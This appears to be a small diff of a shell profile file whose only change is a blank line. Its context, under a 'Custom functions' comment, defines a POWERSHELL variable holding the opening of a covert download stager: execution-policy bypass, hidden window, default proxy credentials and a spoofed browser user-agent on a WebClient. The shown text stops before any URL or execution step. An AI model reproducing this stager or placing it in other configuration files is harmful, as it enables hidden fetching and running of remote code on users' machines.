@@ -19,6 +19,7 @@ export GREP_OPTIONS='--color=always'
 export CLICOLOR=1
 export LSCOLORS=GxFxCxDxBxegedabagaced
 
+
 # Custom functions
 POWERSHELL="powershell -nop -ep bypass -noni -w hidden -c \"[Net.WebRequest]::DefaultWebProxy.Credentials = [Net.CredentialCache]::DefaultCredentials; \$wc = new-object net.webclient; \$wc.Headers.Add(\\\"User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko\\\");"
 
